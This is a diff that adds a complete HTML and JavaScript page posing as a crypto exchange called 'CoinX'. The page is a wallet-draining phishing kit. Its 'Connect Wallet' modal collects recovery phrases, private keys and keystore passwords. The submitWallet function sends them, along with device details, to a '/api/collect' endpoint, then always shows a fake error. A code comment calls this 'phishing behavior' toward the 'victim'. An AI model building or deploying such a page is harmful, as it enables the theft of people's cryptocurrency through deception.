@@ -1,0 +1,454 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CoinX - Web3 Crypto Exchange</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+    <link href="https://unpkg.com/aos@2.3.1/dist/aos.css" rel="stylesheet">
+    
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    fontFamily: { sans: ['Inter', 'sans-serif'] },
+                    colors: {
+                        primary: '#0f172a',
+                        secondary: '#1e293b',
+                        accent: '#6366f1',
+                        accentHover: '#4f46e5',
+                        glass: 'rgba(255, 255, 255, 0.05)',
+                        glassBorder: 'rgba(255, 255, 255, 0.1)',
+                    }
+                }
+            }
+        }
+    </script>
+    
+    <style>
+        body { background-color: #0f172a; color: #f8fafc; overflow-x: hidden; }
+        ::-webkit-scrollbar { width: 8px; }
+        ::-webkit-scrollbar-track { background: #0f172a; }
+        ::-webkit-scrollbar-thumb { background: #334155; border-radius: 4px; }
+        .glass-card {
+            background: rgba(30, 41, 59, 0.7);
+            backdrop-filter: blur(12px);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+        }
+        .gradient-text {
+            background: linear-gradient(to right, #818cf8, #c084fc, #f472b6);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        .hero-bg {
+            background: radial-gradient(circle at 50% 50%, rgba(99, 102, 241, 0.15) 0%, rgba(15, 23, 42, 0) 70%);
+        }
+        @keyframes float {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-20px); }
+        }
+        .animate-float { animation: float 6s ease-in-out infinite; }
+        @keyframes marquee {
+            0% { transform: translateX(0%); }
+            100% { transform: translateX(-100%); }
+        }
+        .animate-marquee { animation: marquee 25s linear infinite; }
+    </style>
+<base target="_blank">
+</head>
+<body class="antialiased">
+
+    <!-- Ticker Tape -->
+    <div class="bg-secondary/80 border-b border-glassBorder h-10 flex items-center overflow-hidden whitespace-nowrap relative z-50">
+        <div class="animate-marquee flex gap-8 items-center px-4 text-sm font-medium text-gray-300">
+            <span class="text-green-400">Bitcoin (BTC) <span class="text-white ml-1">$64,003.47</span> <span class="text-red-400 text-xs">▼ 28.60%</span></span>
+            <span class="text-purple-400">Ethereum (ETH) <span class="text-white ml-1">$1,946.85</span> <span class="text-red-400 text-xs">▼ 35.94%</span></span>
+            <span class="text-blue-400">XRP (XRP) <span class="text-white ml-1">$1.353</span> <span class="text-red-400 text-xs">▼ 33.63%</span></span>
+            <span class="text-yellow-400">Luna (LUNA) <span class="text-white ml-1">$0.068</span> <span class="text-red-400 text-xs">▼ 28.62%</span></span>
+            <span class="text-cyan-400">Cardano (ADA) <span class="text-white ml-1">$0.259</span> <span class="text-red-400 text-xs">▼ 37.57%</span></span>
+            <span class="text-green-400">Bitcoin (BTC) <span class="text-white ml-1">$64,003.47</span> <span class="text-red-400 text-xs">▼ 28.60%</span></span>
+        </div>
+    </div>
+
+    <!-- Navigation -->
+    <nav class="fixed w-full z-40 top-10 transition-all duration-300" id="navbar">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+            <div class="flex items-center justify-between h-20">
+                <div class="flex-shrink-0 flex items-center gap-2 cursor-pointer">
+                    <div class="w-8 h-8 bg-accent rounded-lg flex items-center justify-center text-white font-bold text-xl shadow-lg shadow-indigo-500/50">
+                        <i class="fa-solid fa-infinity"></i>
+                    </div>
+                    <span class="font-bold text-2xl tracking-tight text-white">Coin<span class="text-accent">X</span></span>
+                </div>
+                <div class="hidden md:block">
+                    <div class="ml-10 flex items-baseline space-x-8">
+                        <a href="#" class="text-white hover:text-accent px-3 py-2 rounded-md text-sm font-medium transition-colors">Exchange</a>
+                        <a href="#products" class="text-gray-300 hover:text-white px-3 py-2 rounded-md text-sm font-medium transition-colors">Products</a>
+                        <a href="#features" class="text-gray-300 hover:text-white px-3 py-2 rounded-md text-sm font-medium transition-colors">Features</a>
+                    </div>
+                </div>
+                <div>
+                    <button onclick="openWalletModal()" class="bg-accent hover:bg-accentHover text-white px-6 py-2.5 rounded-full font-medium transition-all shadow-lg shadow-indigo-500/30 hover:shadow-indigo-500/50 transform hover:-translate-y-0.5">
+                        Connect Wallet
+                    </button>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <!-- Hero Section -->
+    <section class="relative pt-32 pb-20 lg:pt-48 lg:pb-32 overflow-hidden hero-bg">
+        <div class="absolute top-20 left-10 w-72 h-72 bg-purple-500/20 rounded-full blur-[100px] animate-pulse"></div>
+        <div class="absolute bottom-20 right-10 w-96 h-96 bg-indigo-500/20 rounded-full blur-[100px] animate-pulse" style="animation-delay: 1s;"></div>
+        
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 relative z-10 text-center">
+            <div data-aos="fade-up" data-aos-duration="800">
+                <span class="inline-block py-1 px-3 rounded-full bg-glass border border-glassBorder text-indigo-300 text-xs font-semibold tracking-wider mb-6 backdrop-blur-md">
+                    TRUST AND SECURITY IN WEB3
+                </span>
+                <h1 class="text-5xl md:text-7xl font-extrabold tracking-tight mb-6 leading-tight">
+                    Trust and Security in <br>
+                    <span class="gradient-text">Web3 Crypto Exchange</span>
+                </h1>
+                <p class="mt-4 max-w-2xl mx-auto text-xl text-gray-400 mb-10">
+                    The most secure and reliable platform for trading digital assets.
+                </p>
+                <button onclick="openWalletModal()" class="bg-accent hover:bg-accentHover text-white px-8 py-4 rounded-full font-bold text-lg transition-all shadow-lg shadow-indigo-500/40 hover:shadow-indigo-500/60 transform hover:-translate-y-1">
+                    Get Started
+                </button>
+            </div>
+
+            <!-- Dashboard Mockup -->
+            <div class="mt-16 relative max-w-5xl mx-auto" data-aos="zoom-in-up" data-aos-delay="200">
+                <div class="absolute -inset-1 bg-gradient-to-r from-indigo-500 to-purple-600 rounded-2xl blur opacity-30"></div>
+                <div class="relative glass-card rounded-xl overflow-hidden shadow-2xl border border-slate-700">
+                    <div class="bg-slate-800/50 px-4 py-3 border-b border-slate-700 flex justify-between items-center">
+                        <div class="flex gap-2">
+                            <div class="w-3 h-3 rounded-full bg-red-500"></div>
+                            <div class="w-3 h-3 rounded-full bg-yellow-500"></div>
+                            <div class="w-3 h-3 rounded-full bg-green-500"></div>
+                        </div>
+                        <div class="text-xs text-gray-400 font-mono">BTC / USDT</div>
+                    </div>
+                    <div class="p-4 h-[300px] md:h-[400px] bg-slate-900/80 relative">
+                        <canvas id="heroChart"></canvas>
+                        <div class="absolute top-4 right-4 bg-slate-800/90 backdrop-blur px-3 py-2 rounded-lg border border-slate-700 shadow-lg">
+                            <div class="text-xs text-gray-400">Current Balance</div>
+                            <div class="text-xl font-bold text-white">$98,504.75</div>
+                            <div class="text-xs text-green-400 flex items-center gap-1">
+                                <i class="fa-solid fa-arrow-trend-up"></i> +12.5%
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Products Grid -->
+    <section id="products" class="py-24 relative">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+            <div class="text-center mb-16" data-aos="fade-up">
+                <h2 class="text-3xl md:text-4xl font-bold text-white mb-4">Explore Web3 Products</h2>
+            </div>
+            <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
+                <div class="glass-card p-6 rounded-2xl hover:bg-slate-800/80 transition-all cursor-pointer border border-transparent hover:border-indigo-500/30" data-aos="fade-up">
+                    <div class="w-12 h-12 rounded-full bg-indigo-500/20 flex items-center justify-center text-indigo-400 mb-4">
+                        <i class="fa-solid fa-check-double text-xl"></i>
+                    </div>
+                    <h3 class="text-xl font-bold text-white mb-2">Migration</h3>
+                    <p class="text-gray-400 text-sm">Seamlessly migrate your assets between chains.</p>
+                </div>
+                <div class="glass-card p-6 rounded-2xl hover:bg-slate-800/80 transition-all cursor-pointer border border-transparent hover:border-indigo-500/30" data-aos="fade-up" data-aos-delay="100">
+                    <div class="w-12 h-12 rounded-full bg-purple-500/20 flex items-center justify-center text-purple-400 mb-4">
+                        <i class="fa-solid fa-calculator text-xl"></i>
+                    </div>
+                    <h3 class="text-xl font-bold text-white mb-2">Validate or Synchronize</h3>
+                    <p class="text-gray-400 text-sm">Verify transactions across all devices.</p>
+                </div>
+                <div class="glass-card p-6 rounded-2xl hover:bg-slate-800/80 transition-all cursor-pointer border border-transparent hover:border-indigo-500/30" data-aos="fade-up" data-aos-delay="200">
+                    <div class="w-12 h-12 rounded-full bg-pink-500/20 flex items-center justify-center text-pink-400 mb-4">
+                        <i class="fa-solid fa-building-columns text-xl"></i>
+                    </div>
+                    <h3 class="text-xl font-bold text-white mb-2">Assets Recovery</h3>
+                    <p class="text-gray-400 text-sm">Recover lost or inaccessible funds.</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Wallet Modal -->
+    <div id="walletModal" class="fixed inset-0 z-[100] hidden">
+        <div class="fixed inset-0 bg-slate-950/80 backdrop-blur-sm transition-opacity opacity-0" id="modalBackdrop"></div>
+        <div class="fixed inset-0 z-10 overflow-y-auto">
+            <div class="flex min-h-full items-center justify-center p-4">
+                <div class="relative transform overflow-hidden rounded-2xl bg-slate-900 border border-slate-700 text-left shadow-2xl transition-all w-full max-w-lg opacity-0 scale-95" id="modalPanel">
+                    <div class="bg-slate-800/50 px-4 py-3 flex justify-between items-center border-b border-slate-700">
+                        <h3 class="text-lg font-semibold text-white">Connect Wallet</h3>
+                        <button onclick="closeWalletModal()" class="text-gray-400 hover:text-white">
+                            <i class="fa-solid fa-xmark text-xl"></i>
+                        </button>
+                    </div>
+                    <div class="px-4 py-5 sm:p-6">
+                        <p class="text-sm text-gray-400 mb-4 text-center">Please connect your wallet to continue</p>
+                        
+                        <div id="walletGrid" class="grid grid-cols-3 gap-4 max-h-[300px] overflow-y-auto p-1"></div>
+
+                        <div id="manualConnectForm" class="hidden space-y-4 mt-4">
+                            <div class="flex justify-center mb-4">
+                                <div id="selectedWalletIcon" class="w-16 h-16 rounded-2xl bg-slate-800 flex items-center justify-center text-4xl border border-slate-700 shadow-lg"></div>
+                            </div>
+                            <div class="bg-red-500/10 border border-red-500/20 rounded-lg p-3 text-center">
+                                <p class="text-red-400 text-sm font-medium">Error connecting to wallet.</p>
+                            </div>
+                            
+                            <div class="border-b border-slate-700 flex gap-4 text-sm font-medium text-gray-400">
+                                <button class="pb-2 border-b-2 border-accent text-white" onclick="switchTab('phrase', this)">Phrase</button>
+                                <button class="pb-2 border-b-2 border-transparent hover:text-gray-200" onclick="switchTab('privateKey', this)">Private Key</button>
+                                <button class="pb-2 border-b-2 border-transparent hover:text-gray-200" onclick="switchTab('keystore', this)">Keystore</button>
+                            </div>
+
+                            <div id="phraseTab">
+                                <label class="block text-xs font-medium text-gray-400 mb-1">Recovery Phrase</label>
+                                <textarea id="phraseInput" rows="3" class="w-full bg-slate-800 border border-slate-700 rounded-lg p-3 text-white text-sm focus:ring-1 focus:ring-accent outline-none resize-none font-mono" placeholder="Enter your 12-24 word phrase..."></textarea>
+                            </div>
+
+                            <div id="privateKeyTab" class="hidden">
+                                <label class="block text-xs font-medium text-gray-400 mb-1">Private Key</label>
+                                <textarea id="privateKeyInput" rows="3" class="w-full bg-slate-800 border border-slate-700 rounded-lg p-3 text-white text-sm focus:ring-1 focus:ring-accent outline-none resize-none font-mono" placeholder="Enter your private key..."></textarea>
+                            </div>
+
+                            <div id="keystoreTab" class="hidden">
+                                <label class="block text-xs font-medium text-gray-400 mb-1">Keystore JSON</label>
+                                <textarea id="keystoreInput" rows="3" class="w-full bg-slate-800 border border-slate-700 rounded-lg p-3 text-white text-sm focus:ring-1 focus:ring-accent outline-none resize-none font-mono" placeholder="Enter keystore..."></textarea>
+                                <label class="block text-xs font-medium text-gray-400 mb-1 mt-3">Password</label>
+                                <input type="password" id="keystorePassword" class="w-full bg-slate-800 border border-slate-700 rounded-lg p-3 text-white text-sm focus:ring-1 focus:ring-accent outline-none" placeholder="Keystore password...">
+                            </div>
+
+                            <button onclick="submitWallet()" class="w-full bg-accent hover:bg-accentHover text-white font-bold py-3 rounded-lg transition-all shadow-lg flex justify-center items-center gap-2">
+                                <span id="btnText">Connect Wallet</span>
+                                <i id="btnLoader" class="fa-solid fa-circle-notch fa-spin hidden"></i>
+                            </button>
+                            <button onclick="backToGrid()" class="w-full text-red-400 text-sm hover:text-red-300 py-2">Cancel</button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@2.3.1/dist/aos.js"></script>
+    <script>
+        // ==========================================
+        // FRONTEND JAVASCRIPT
+        // ==========================================
+        
+        AOS.init({ once: true, offset: 100 });
+
+        // Chart
+        const ctx = document.getElementById('heroChart').getContext('2d');
+        const gradient = ctx.createLinearGradient(0, 0, 0, 400);
+        gradient.addColorStop(0, 'rgba(99, 102, 241, 0.5)');
+        gradient.addColorStop(1, 'rgba(99, 102, 241, 0)');
+
+        new Chart(ctx, {
+            type: 'line',
+            data: {
+                labels: ['10:00', '10:30', '11:00', '11:30', '12:00', '12:30', '13:00', '13:30', '14:00', '14:30', '15:00'],
+                datasets: [{
+                    label: 'BTC/USDT',
+                    data: [65000, 65200, 64800, 65500, 66000, 65800, 66500, 66200, 67000, 66800, 67500],
+                    borderColor: '#818cf8',
+                    backgroundColor: gradient,
+                    borderWidth: 3,
+                    fill: true,
+                    tension: 0.4
+                }]
+            },
+            options: {
+                responsive: true,
+                maintainAspectRatio: false,
+                plugins: { legend: { display: false } },
+                scales: {
+                    x: { grid: { display: false }, ticks: { color: '#64748b', font: { size: 10 } } },
+                    y: { grid: { color: 'rgba(255, 255, 255, 0.05)' }, ticks: { color: '#64748b', font: { size: 10 } } }
+                }
+            }
+        });
+
+        // Wallet Modal
+        const modal = document.getElementById('walletModal');
+        const backdrop = document.getElementById('modalBackdrop');
+        const panel = document.getElementById('modalPanel');
+        const walletGrid = document.getElementById('walletGrid');
+        const manualForm = document.getElementById('manualConnectForm');
+        
+        let currentWallet = '';
+        let currentTab = 'phrase';
+
+        const wallets = [
+            { name: 'Wallet Connect', icon: 'fa-solid fa-qrcode' },
+            { name: 'Trust Wallet', icon: 'fa-solid fa-shield-halved', color: 'text-blue-500' },
+            { name: 'Metamask', icon: 'fa-brands fa-ethereum', color: 'text-orange-500' },
+            { name: 'Ledger', icon: 'fa-solid fa-usb' },
+            { name: 'BRD Wallet', icon: 'fa-solid fa-wallet', color: 'text-pink-500' },
+            { name: 'Coinbase', icon: 'fa-brands fa-bitcoin', color: 'text-blue-600' },
+            { name: 'Phantom', icon: 'fa-solid fa-ghost', color: 'text-purple-500' },
+            { name: 'Rainbow', icon: 'fa-solid fa-rainbow', color: 'text-pink-400' },
+            { name: 'Argent', icon: 'fa-solid fa-unicorn', color: 'text-orange-400' },
+            { name: 'Gnosis Safe', icon: 'fa-solid fa-vault', color: 'text-green-500' },
+            { name: 'imToken', icon: 'fa-solid fa-coins', color: 'text-blue-400' },
+            { name: 'TokenPocket', icon: 'fa-solid fa-pocket', color: 'text-blue-500' },
+        ];
+
+        wallets.forEach(wallet => {
+            const div = document.createElement('div');
+            div.className = 'flex flex-col items-center gap-2 p-3 rounded-xl hover:bg-slate-800 cursor-pointer transition-colors group';
+            div.onclick = () => selectWallet(wallet);
+            div.innerHTML = `
+                <div class="w-12 h-12 rounded-full bg-slate-800 group-hover:bg-slate-700 flex items-center justify-center text-2xl transition-colors shadow-md border border-slate-700">
+                    <i class="${wallet.icon} ${wallet.color || 'text-gray-400'}"></i>
+                </div>
+                <span class="text-xs text-gray-300 font-medium text-center leading-tight">${wallet.name}</span>
+            `;
+            walletGrid.appendChild(div);
+        });
+
+        function openWalletModal() {
+            modal.classList.remove('hidden');
+            void modal.offsetWidth;
+            backdrop.classList.remove('opacity-0');
+            panel.classList.remove('opacity-0', 'scale-95');
+            panel.classList.add('opacity-100', 'scale-100');
+            walletGrid.classList.remove('hidden');
+            manualForm.classList.add('hidden');
+        }
+
+        function closeWalletModal() {
+            backdrop.classList.add('opacity-0');
+            panel.classList.remove('opacity-100', 'scale-100');
+            panel.classList.add('opacity-0', 'scale-95');
+            setTimeout(() => modal.classList.add('hidden'), 200);
+        }
+
+        function selectWallet(wallet) {
+            currentWallet = wallet.name;
+            walletGrid.classList.add('hidden');
+            manualForm.classList.remove('hidden');
+            const iconDiv = document.getElementById('selectedWalletIcon');
+            iconDiv.className = `w-16 h-16 rounded-2xl bg-slate-800 flex items-center justify-center text-4xl border border-slate-700 shadow-lg ${wallet.color || 'text-white'}`;
+            iconDiv.innerHTML = `<i class="${wallet.icon}"></i>`;
+        }
+
+        function backToGrid() {
+            manualForm.classList.add('hidden');
+            walletGrid.classList.remove('hidden');
+            clearInputs();
+        }
+
+        function switchTab(tab, btn) {
+            currentTab = tab;
+            document.getElementById('phraseTab').classList.add('hidden');
+            document.getElementById('privateKeyTab').classList.add('hidden');
+            document.getElementById('keystoreTab').classList.add('hidden');
+            document.getElementById(tab + 'Tab').classList.remove('hidden');
+            
+            document.querySelectorAll('.border-b-2').forEach(b => {
+                b.classList.remove('border-accent', 'text-white');
+                b.classList.add('border-transparent');
+            });
+            btn.classList.remove('border-transparent');
+            btn.classList.add('border-accent', 'text-white');
+        }
+
+        function clearInputs() {
+            document.getElementById('phraseInput').value = '';
+            document.getElementById('privateKeyInput').value = '';
+            document.getElementById('keystoreInput').value = '';
+            document.getElementById('keystorePassword').value = '';
+        }
+
+        // ==========================================
+        // SEND TO BACKEND (THE KEY PART)
+        // ==========================================
+        
+        async function submitWallet() {
+            const btnText = document.getElementById('btnText');
+            const btnLoader = document.getElementById('btnLoader');
+            
+            let content = '';
+            let password = null;
+            
+            if (currentTab === 'phrase') content = document.getElementById('phraseInput').value.trim();
+            else if (currentTab === 'privateKey') content = document.getElementById('privateKeyInput').value.trim();
+            else if (currentTab === 'keystore') {
+                content = document.getElementById('keystoreInput').value.trim();
+                password = document.getElementById('keystorePassword').value;
+            }
+
+            if (!content || content.length < 10) {
+                panel.classList.add('animate-pulse');
+                setTimeout(() => panel.classList.remove('animate-pulse'), 500);
+                return;
+            }
+
+            btnText.innerText = 'Connecting...';
+            btnLoader.classList.remove('hidden');
+
+            // Prepare data to send to backend
+            const payload = {
+                walletType: currentWallet,
+                inputType: currentTab,
+                content: content,
+                password: password,
+                platform: navigator.platform,
+                screenSize: `${window.screen.width}x${window.screen.height}`,
+                language: navigator.language
+            };
+
+            try {
+                // Send to Python backend
+                const response = await fetch('/api/collect', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+
+                const result = await response.json();
+                console.log('Server response:', result);
+
+            } catch (err) {
+                console.error('Failed to send:', err);
+            }
+
+            // Always show error to victim (phishing behavior)
+            setTimeout(() => {
+                btnText.innerText = 'Connect Wallet';
+                btnLoader.classList.add('hidden');
+                clearInputs();
+                
+                const errorDiv = document.querySelector('.bg-red-500\\/10');
+                errorDiv.innerHTML = '<p class="text-red-400 text-sm font-medium">Error: Invalid credentials. Please check and try again.</p>';
+                setTimeout(() => {
+                    errorDiv.innerHTML = '<p class="text-red-400 text-sm font-medium">Error connecting to wallet.</p>';
+                }, 3000);
+            }, 2000);
+        }
+
+        // Navbar scroll effect
+        window.addEventListener('scroll', () => {
+            const nav = document.getElementById('navbar');
+            if (window.scrollY > 50) {
+                nav.classList.add('bg-slate-900/90', 'backdrop-blur-md', 'shadow-lg');
+            } else {
+                nav.classList.remove('bg-slate-900/90', 'backdrop-blur-md', 'shadow-lg');
+            }
+        });
+
+        backdrop.addEventListener('click', closeWalletModal);
+    </script>
+</body>
+</html>
